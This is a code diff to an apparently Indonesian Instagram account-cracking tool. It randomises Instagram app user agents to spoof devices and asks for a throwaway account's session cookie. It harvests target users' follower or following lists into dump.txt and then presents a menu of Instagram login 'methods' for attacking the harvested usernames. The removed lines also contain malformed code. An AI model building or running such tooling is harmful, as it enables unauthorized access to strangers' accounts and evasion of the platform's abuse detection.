@@ -162,80 +162,23 @@ def UserAgentApp():
 
 
 def InstagramX():
-    rr = random.randint
-    rc = random.choice
-    version_android = rc(["4.4.2", "4.4.3", "4.4.4", "4.4.5", "4.4.6", "4.4.7", "4.4.8", "4.4.9", "5.0", "5.0.1","5.0.2", "5.1.1", "6.0", "6.0.1", "6.0.2", "6.0.3", "6.0.4", "7.0", "7.1.1", "7.1.2", "8.0.0", "8.1.0", "9", "10", "11", "12", "13"])
-    version_ios = rc(["10_3_3","10_3_2","9_3_5","11_2_6", "11_2_7", "11_2_8", "11_2_9", "11_2_10", "11_2_11", "11_2_12", "11_2_13", "11_2_14", "11_2_15"])
-    cromonium_android = str(random.randint(20,99))+".0."+str(random.randint(9,9999))+"."+str(random.randint(50,999))
-    merek_android = rc(["SM-G950U Build/NRD90M","GT-I9301I Build/KOT49H","SM-A510F Build/NRD90M","PRO 6 Build/MRA58K","m3 note Build/LMY47I","ONEPLUS A5000 Build/OPR1.170623.032","MI MAX Build/NRD90M","Redmi 4 Build/MMB29M","m2 Build/LMY47D","HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196","Redmi Note 4 Build/NRD90M","SM-G950F Build/R16NW;","SM-G950F Build/NRD90M","SM-E500H Build/LMY47X","LG-H815 Build/LMY47D","SM-G935F Build/NRD90M","XT1585 Build/NCK25.118-10.5","SM-N910F Build/MMB29M","7048X Build/LRX22G","LG-D331 Build/KOT49I","HUAWEI VNS-L31 Build/HUAWEIVNS-L31","SM-J730F Build/NRD90M","MX6 Build/MRA58K"])
-	mobile_ios = rc(["Mobile/15D100","Mobile/14G60","Mobile/13G36","Mobile/15C202"."Mobile/15A372"])
+	rr = random.randint
+	rc = random.choice
+	version_android = rc(["4.4.2", "4.4.3", "4.4.4", "4.4.5", "4.4.6", "4.4.7", "4.4.8", "4.4.9", "5.0", "5.0.1","5.0.2", "5.1.1", "6.0", "6.0.1", "6.0.2", "6.0.3", "6.0.4", "7.0", "7.1.1", "7.1.2", "8.0.0", "8.1.0", "9", "10", "11", "12", "13"])
+	version_ios = rc(["10_3_3","10_3_2","9_3_5","11_2_6", "11_2_7", "11_2_8", "11_2_9", "11_2_10", "11_2_11", "11_2_12", "11_2_13", "11_2_14", "11_2_15"])
+	cromonium_android = str(random.randint(20,99))+".0."+str(random.randint(9,9999))+"."+str(random.randint(50,999))
+	merek_android = rc(["SM-N910F", "7048X", "LG-D331", "HUAWEI", "SM-J730F", "MX6", "Nexus", "SM-E500H", "SM-G925F", "Lenovo", "LG-H815", "SM-G935F", "XT1585", "SM-G950F", "ru-ru", "SM-G950F", "Redmi", "HUAWEI", "m2", "Redmi", "MI", "ONEPLUS", "Redmi", "m3", "PRO", "SM-A510F", "GT-I9301I", "SM-G950U", "PRO", "SM-G930F", "SM-J710F", "XT1585", "SM-N900", "Mi", "Redmi", "Redmi", "HUAWEI", "SM-G925F", "Nexus", "SM-G920F", "SM-A710F", "Moto", "HUAWEI", "SM-A310F", "Z", "ALE-L21", "SM-J701F", "Redmi", "SM-G950F", "SM-G930F", "M5", "Power1", "en-us", "VF-696", "SM-A520F", "VF-696", "STARNAUTE3", "SM-G531F", "SM-J320FN", "U", "Y300", "ALE-L21", "SM-J500FN", "SM-J510FN", "STARNAUTE4", "SM-G530FZ", "pt-pt", "PULP", "C5", "4047D", "AGS-W09", "LG-H500", "Redmi", "LG-D802", "Redmi", "SM-A720F", "Lenovo", "SM-N950F", "Redmi", "SM-G935F", "m2", "SM-J510FN", "Lenovo", "SM-J510H", "m3", "MX5", "Redmi", "Nexus", "Lenovo", "XT1254", "vivo", "HUAWEI", "PRA-LA1", "Mi", "A0001", "SM-N950F", "SM-G930F", "GT-I9505", "F3112", "Redmi", "SM-G950F", "SM-A510F", "ZTE", "SM-A520F", "Redmi", "Redmi", "HARRY", "Redmi", "SM-G361H", "SM-J5108", "F5321", "Le", "uk-ua", "BV6000", "SM-G955F", "SM-A500H", "Redmi", "SM-J510H", "SM-G935F", "BV5000", "GT-P5200", "HUAWEI", "SM-A510F", "SM-A510F", "Aquaris_M4", "5051D", "JERRY", "ASUS_A007", "MEO", "Hisense", "SM-J730F", "HUAWEI", "SM-J710F", "ZTE", "STARNAUTE3", "ZTE", "SM-G531F", "SM-G930F", "SM-J500F", "SM-J320FN", "FREDDY", "SM-A310F", "HUAWEI", "SM-G530FZ", "LG-D724", "m3", "SM-T561", "Mi", "Redmi", "SM-A720F", "PRA-LA1", "Lenovo", "Redmi", "SM-A310F", "HTC", "SM-A500FU", "HUAWEI", "ru-ru", "SM-J530FM", "SM-J320H", "SM-A520F", "m3", "PRO", "SM-J700H", "SM-J730FM", "SM-J320F", "LG-D724", "M5c", "SM-G361H", "GT-I9515", "SM-G903F"])
+	mobile_ios = rc(["Mobile/15D100","Mobile/14G60","Mobile/13G36","Mobile/15C202","Mobile/15A372"])
 	ipad_ios = str(random.randint(1,9))+"."+str(random.randint(1,5))
-	version_lang = rc(["pt_PT; pt-PT;","en_US; en-US;","uk_UA; uk-UA;","ru_RU; ru-RU;","de_DE; de-DE;"])
-    Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)
-Mozilla/5.0 (Linux; Android ; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)
-Mozilla/5.0 (Linux; Android ; 7048X Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.2; 320dpi; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)
-Mozilla/5.0 (Linux; Android ; LG-D331 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 240dpi; 480x782; LGE/lge; LG-D331; luv80ss; mt6582; es_VE; 98288237)
-Mozilla/5.0 (Linux; Android ; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; pt_PT; pt-PT; scale=2.00; gamut=normal; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPad2,5; iPhone OS 9_3_5; pt_PT; pt-PT; scale=2.00; gamut=normal; 960x640)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,4; iOS 11_2_6; en_US; en-US; scale=2.88; gamut=wide; 1080x1920)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,1; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone9,4; iOS 10_3_3; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_6; hu_HU; hu-HU; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (Linux; Android 7.0; SM-J730F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870; de_DE; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)
-Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 37.0.0.9.96 (iPhone7,2; iOS 10_3_2; ru_RU; ru-RU; scale=2.00; gamut=normal; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)
-Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 98288242)
-Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_2; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (Linux; Android 5.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-E500H; e53g; qcom; ru_RU; 98288239)
-Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 560dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; uk_UA; 98288242)
-Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a40 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; LENOVO/Lenovo; Lenovo A6020a40; A6020a40; qcom; ru_RU; 98288239)
-Mozilla/5.0 (Linux; Android 5.1; LG-H815 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 640dpi; 1440x2392; LGE/lge; LG-H815; p1; p1; uk_UA; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_0; ru_US; ru-US; scale=2.00; gamut=wide; 750x1334)
-Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,2; iOS 11_2_5; uk_UA; uk-UA; scale=2.61; gamut=normal; 1080x1920)
-Mozilla/5.0 (Linux; Android 7.0; XT1585 Build/NCK25.118-10.5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 640dpi; 2368x1440; motorola; XT1585; kinzie; qcom; ru; 98288242)
-Mozilla/5.0 (Linux; Android 7.0; SM-G950F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; de_DE; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; de_DE; de-DE; scale=2.61; gamut=wide; 1080x1920)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,4; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=normal; 640x1136)
-Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone6,1; iOS 10_3_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,4; iOS 11_2_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 Instagram 37.0.0.9.96 (iPhone10,6; iOS 11_2_1; en_US; en-US; scale=3.00; gamut=wide; 1125x2436)
-Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)
-Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0; 480dpi; 1080x2076; samsung; SM-G950F; dreamlte; samsungexynos8895; ru_UA; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPad6,3; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 640x960)
-Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; uk_UA; 98288242)
-Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone6,2; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)
-Mozilla/5.0 (Linux; Android 5.1; m2 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.114 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 320dpi; 720x1280; Meizu; m2; m2; mt6735; ru_RU; 98288239)
-Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 480dpi; 1080x1920; Xiaomi; Redmi 4; markw; qcom; ru_RU; 98288242)
-Mozilla/5.0 (Linux; Android 7.0; MI MAX Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 440dpi; 1080x1920; Xiaomi; MI MAX; hydrogen; qcom; ru_RU; 98288242)
-Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0; 480dpi; 1080x1920; OnePlus; ONEPLUS A5000; OnePlus5; qcom; ru_UA; 98288242)
-Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1920x1080; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPhone4,1; iPhone OS 9_3_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x960)
-Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 480dpi; 1080x1920; Meizu; m3 note; m3note; mt6755; ru_RU; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_5; de_DE; de-DE; scale=2.88; gamut=wide; 1080x1920)
-Mozilla/5.0 (Linux; Android 6.0; PRO 6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; PRO 6; PRO6; mt6797; ru_RU; 98288242)
-Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A510F; a5xelte; samsungexynos7580; de_DE; 98288242)
-Mozilla/5.0 (Linux; Android 4.4.2; GT-I9301I Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 320dpi; 720x1280; samsung; GT-I9301I; s3ve3g; qcom; hu_HU; 98288239)
-Mozilla/5.0 (Linux; Android 7.0; SM-G950U Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x2076; samsung; SM-G950U; dreamqltesq; qcom; en_US; 98288242)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; en_UA; en-UA; scale=2.00; gamut=normal; 750x1334)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_2; de_DE; de-DE; scale=2.61; gamut=wide; 1080x1920)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone6,1; iOS 11_2_6; uk_UA; uk; scale=2.00; gamut=normal; 640x1136)
-Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPhone4,1; iPhone OS 9_3_5; uk_UA; ru-UA; scale=2.00; gamut=normal; 640x960)
-Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A421 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_0_2; uk_UA; uk-UA; scale=2.00; gamut=normal; 750x1334)
-
-
-
-
-
-
-
+	merek_ios =rc(["iPhone7,2", "iPhone8,1", "iPhone9,4", "iPhone9,1", "iPhone9,4", "iPhone7,2", "iPhone10,4", "iPhone9,3", "iPhone10,5", "iPhone7,2", "iPhone8,1", "iPhone9,3", "iPhone10,4", "iPhone9,3", "iPhone8,2", "iPhone10,5", "iPhone8,4", "iPhone6,1", "iPhone8,4", "iPhone10,6", "iPhone6,2", "iPhone4,1", "iPhone10,5", "iPhone8,1", "iPhone10,5", "iPhone6,1", "iPhone4,1", "iPhone8,1", "iPhone5,1", "iPhone5,2", "iPhone8,1", "iPhone7,2", "iPhone7,2", "iPhone7,2", "iPhone10,6", "iPhone10,3", "iPhone6,2", "iPhone8,1", "iPhone5,1", "iPhone6,2", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone10,5", "iPhone9,3", "iPhone9,3", "iPhone7,2", "iPhone4,1", "iPhone6,2", "iPhone10,6", "iPhone7,2", "iPhone8,1", "iPhone9,3", "iPhone8,1", "iPhone8,1", "iPhone8,1", "iPhone9,3", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone8,2", "iPhone7,2", "iPhone8,1", "iPhone10,5", "iPhone6,2", "iPhone8,1", "iPhone9,4", "iPhone10,6", "iPhone9,1", "iPhone8,1", "iPhone9,3", "iPhone8,1", "iPhone6,1", "iPhone6,1"])
+	version_lang = rc(["pt_PT", "pt_PT", "en_US", "uk_UA", "ru_RU", "de_DE", "de_DE", "hu_HU", "ru_RU", "ru_RU", "ru_UA", "ru_UA", "ru_UA", "ru_US", "uk_UA", "de_DE", "uk_UA", "ru_UA", "ru_UA", "en_US", "ru_UA", "ru_UA", "de_DE", "en_UA", "de_DE", "uk_UA", "uk_UA", "uk_UA", "uk_UA", "ru_RU", "de_DE", "ru_UA", "ru_UA", "ru_US", "ru_UA", "ru_UA", "ru_UA", "en_PT", "pt_PT", "pt_PT", "pt_PT", "en_UA", "de_DE", "en_UA", "ru_BY", "ru_UA", "ru_UA", "de_DE", "uk_UA", "ru_UA", "ru_UA", "ru_UA", "ru_RU", "ru_US", "ru_UA", "uk_UA", "de_DE", "uk_UA", "ru_RU", "tr_TR", "de_DE", "ru_UA", "ru_RU", "ru_RU", "ru_UA", "fr_FR", "en_PH", "ru_CZ", "en_UA", "ru_UA", "ru_UA", "ru_UA", "ru_UA", "ru_UA"])
+	gamut_ios= rc(["normal", "wide"])
+	pixel = rc(["750x1331", "1440x2560","1080x1920","750x1334","960x640"])
+	merek_version = rc(["LGE/lge", "LENOVO/Lenovo","zerolte","LGE/google","MX6","HUAWEI","samsung"])
+	android = f'Mozilla/5.0 (Linux; Android {version_android}; {merek_android} Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{cromonium_android} Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; {pixel}; {merek_version}; {merek_android}; trlte; qcom; pt_PT; 98288242)'
+	ios = f'Mozilla/5.0 (iPhone; CPU iPhone OS  like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)'
+	res = rc([android,ios])
+	return res
 
 
 def generate_random_ua():
@@ -279,8 +222,8 @@ def Aset_Ig():
     if os.path.isfile('.Cokies-IG.txt') is True:
         coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
     else:
-        print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
-        raraky = {'cookie':input("\ncookie: ")}
+        prints(Panel.fit(f"[bold white]Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!",style="bold blue"))
+        raraky = {'cookie':input("\n└──╭➣ cookie: ")}
         if raraky['cookie'] == 'res':
             coki = {'cookie':find_res()}
         else:
@@ -299,12 +242,12 @@ def Aset_Ig():
             return coki, full_name, username, follower_count, following_count, media_count
         else:
             os.system('rm -rf .Cokies-IG.txt')
-            print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
+            prints(Panel.fit(f"[bold white]cookies Invalid Gunakan Cookies yang Lain!",style="bold red"))
             time.sleep(3)
             return None, None, None, None, None, None  
     except Exception as e:
         os.system('rm -rf .Cokies-IG.txt')
-        print(f" {M}cookies Invalid Gunakan Cookies yang Lain!")
+        prints(Panel.fit(f"[bold white]cookies Invalid Gunakan Cookies yang Lain!",style="bold red"))
         time.sleep(3)
         return None, None, None, None, None, None 
 
@@ -386,9 +329,9 @@ def dumps(kuki, typess, xyz=[]):
 		except:
 			os.system('rm -rf .Cokies-IG.txt')
 			exit()
-	prints(Panel.fit(f"\n[bold white] Masukan Target Username Anda",style='bold blue'))      
+	prints(Panel.fit(f"[bold white] Masukan Target Username Anda",style='bold blue'))      
 	users = input(f'└──╭➣ Targets User : {b}').split(',')
-	print(f" \n└──╭➣ Process Collecting Username.....")         
+	prints(f" \n[bold white]└──╭➣ Process Collecting Username.....")         
 	threads = []
 	for y in users:
 		thread = threading.Thread(target=process_user, args=(y, kuki, typess, xyz))
@@ -428,12 +371,11 @@ def Graphql(typess, userid, cokie, after):
                 exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
         khm = 'edge_followed_by' if typess is True else 'edge_follow'
         for xyz in req['data']['user'][khm]['edges']:
-            username = xyz['node']['username']
-            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
+            xy = xyz['node']['username']
             if xy not in Uuid:
                 xx += 1
                 Uuid.append(xy)
-                print(f'\r └──╭➣ Mendapatkan ID : {b}{len(Uuid)}', end='')
+                prints(f'\r[bold white]└──╭➣ Mendapatkan ID : {b}{len(Uuid)}', end='')
                 open('dump.txt', 'w').write('\n'.join(Uuid))
         end = req['data']['user'][khm]['page_info']['has_next_page']
         if end is True:
@@ -446,11 +388,11 @@ def Graphql(typess, userid, cokie, after):
 def Metode(): 
 	global Login_Dengan
 	prints(Panel(f"{P2}Total Username Terkumpul : [bold green]{len(Uuid)}[bold white]",width=80,padding=(0,20),style=f"bold blue"))
-	tabel1 = f"[bold white]01\n02\n03"
+	tabel1 = f"[bold white]01\n02\n03\n04"
 	tabel2 = (
-		f"[bold white]Instagram Metode [ www.instagram.com ]\Instagram Metode [ i.instagram.com ]\nInstagram Metode [ i.instagram.com/ajax ]\nLogin Instagram With Metode [ www.instagram.com/v2 ]"
+		f"[bold white]Instagram Metode [ www.instagram.com ]\nInstagram Metode [ i.instagram.com/v1 ]\nInstagram Metode [ i.instagram.com/ajax ]\nInstagram Metode [ www.instagram.com/v2 ]"
 	)
